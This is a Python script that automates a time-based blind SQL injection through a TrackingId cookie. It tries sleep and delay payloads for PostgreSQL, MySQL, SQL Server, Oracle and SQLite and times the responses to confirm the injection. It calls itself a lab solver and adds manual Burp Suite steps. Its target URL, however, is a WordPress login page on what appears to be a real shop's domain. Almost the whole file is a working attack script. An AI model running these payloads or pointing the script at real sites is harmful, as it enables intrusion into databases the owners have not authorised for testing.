import requests
import time
import re

# Lab URL
LAB_URL = "https://dipelectronicslabshop.in/wp-login.php"

def get_tracking_cookie():
    """Get initial TrackingId cookie from the application"""
    print("[*] Getting initial TrackingId cookie...")
    
    session = requests.Session()
    response = session.get(LAB_URL)
    
    # Extract TrackingId from cookies
    if 'TrackingId' in session.cookies:
        tracking_id = session.cookies['TrackingId']
        print(f"[+] Original TrackingId: {tracking_id}")
        return tracking_id, session
    else:
        print("[-] No TrackingId cookie found")
        return None, session

def test_time_delay(session, payload, expected_delay=10):
    """Test a time delay payload"""
    print(f"\n[*] Testing payload: {payload}")
    
    # Set the modified cookie
    cookies = {
        'TrackingId': payload,
        'session': session.cookies.get('session', '')
    }
    
    # Measure response time
    start_time = time.time()
    
    try:
        response = session.get(LAB_URL, cookies=cookies, timeout=expected_delay + 5)
        end_time = time.time()
        
        elapsed_time = end_time - start_time
        print(f"[+] Response time: {elapsed_time:.2f} seconds")
        print(f"[+] Status code: {response.status_code}")
        
        # Check if delay was successful (at least 90% of expected delay)
        if elapsed_time >= (expected_delay * 0.9):
            print(f"[+] SUCCESS! Delay of ~{expected_delay} seconds achieved!")
            return True
        else:
            print("[-] No significant delay detected")
            return False
            
    except requests.Timeout:
        print(f"[!] Request timed out (> {expected_delay + 5} seconds)")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def try_all_delay_payloads(tracking_id, session):
    """Try different database-specific time delay payloads"""
    print("\n" + "=" * 70)
    print("TESTING TIME DELAY PAYLOADS")
    print("=" * 70)
    
    # Common time delay payloads for different databases
    payloads = [
        # PostgreSQL
        ("PostgreSQL", f"{tracking_id}'||pg_sleep(10)--"),
        ("PostgreSQL", f"{tracking_id}'||pg_sleep(10)--+"),
        ("PostgreSQL", f"{tracking_id}'||pg_sleep(10)-- -"),
        ("PostgreSQL", f"x'||pg_sleep(10)--"),
        
        # MySQL
        ("MySQL", f"{tracking_id}' AND SLEEP(10)--"),
        ("MySQL", f"{tracking_id}' AND SLEEP(10)#"),
        ("MySQL", f"{tracking_id}' OR SLEEP(10)--"),
        ("MySQL", f"{tracking_id}' OR SLEEP(10)#"),
        
        # SQL Server
        ("SQL Server", f"{tracking_id}'; WAITFOR DELAY '0:0:10'--"),
        ("SQL Server", f"{tracking_id}' WAITFOR DELAY '0:0:10'--"),
        
        # Oracle
        ("Oracle", f"{tracking_id}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10) IS NULL--"),
        ("Oracle", f"{tracking_id}' OR DBMS_PIPE.RECEIVE_MESSAGE('a',10) IS NULL--"),
        
        # SQLite (less common for web apps)
        ("SQLite", f"{tracking_id}' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--"),
    ]
    
    for db_type, payload in payloads:
        print(f"\n[*] Trying {db_type} payload...")
        if test_time_delay(session, payload):
            print(f"\n[+] SOLVED! Database type appears to be {db_type}")
            print(f"[+] Working payload: {payload}")
            return payload
    
    return None

def quick_solve(session):
    """Try the most likely solution first (PostgreSQL)"""
    print("\n" + "=" * 70)
    print("QUICK SOLVE - PostgreSQL pg_sleep()")
    print("=" * 70)
    
    # The solution indicates PostgreSQL, so try this first
    payload = "x'||pg_sleep(10)--"
    
    if test_time_delay(session, payload):
        return payload
    
    # Try variations
    variations = [
        "x'||pg_sleep(10)--+",
        "x'||pg_sleep(10)-- -",
        "abc'||pg_sleep(10)--",
        "'||pg_sleep(10)||'",
    ]
    
    for var in variations:
        if test_time_delay(session, var):
            return var
    
    return None

def manual_instructions():
    """Provide manual instructions"""
    print("\n" + "=" * 70)
    print("MANUAL SOLUTION")
    print("=" * 70)
    print("\n1. Open Burp Suite and configure your browser to use it as a proxy")
    print("\n2. Visit the lab homepage:")
    print(f"   {LAB_URL}")
    print("\n3. In Burp Suite, go to Proxy > HTTP history")
    print("\n4. Find the GET request to '/' and send it to Repeater (right-click > Send to Repeater)")
    print("\n5. In the Repeater tab, find the Cookie header with TrackingId")
    print("\n6. Change the TrackingId value to:")
    print("   TrackingId=x'||pg_sleep(10)--")
    print("\n7. Send the request and observe it takes 10 seconds to respond")
    print("\n8. The lab should be marked as solved!")

def main():
    print("BLIND SQL INJECTION - TIME DELAYS")
    print("=" * 70)
    
    # Get initial cookie
    tracking_id, session = get_tracking_cookie()
    
    if not tracking_id and not session:
        print("[-] Failed to get initial session")
        manual_instructions()
        return
    
    # Try quick solve first (PostgreSQL)
    print("\n[*] Attempting quick solve with PostgreSQL payload...")
    working_payload = quick_solve(session)
    
    # If quick solve didn't work, try all payloads
    if not working_payload:
        print("\n[!] Quick solve failed, trying all database types...")
        working_payload = try_all_delay_payloads(tracking_id, session)
    
    if working_payload:
        print("\n" + "=" * 70)
        print("LAB SOLVED!")
        print("=" * 70)
        print(f"Working payload: {working_payload}")
        print("\nThe 10-second delay has been triggered!")
    else:
        print("\n[-] Automated attempts failed")
        manual_instructions()

if __name__ == "__main__":
    main()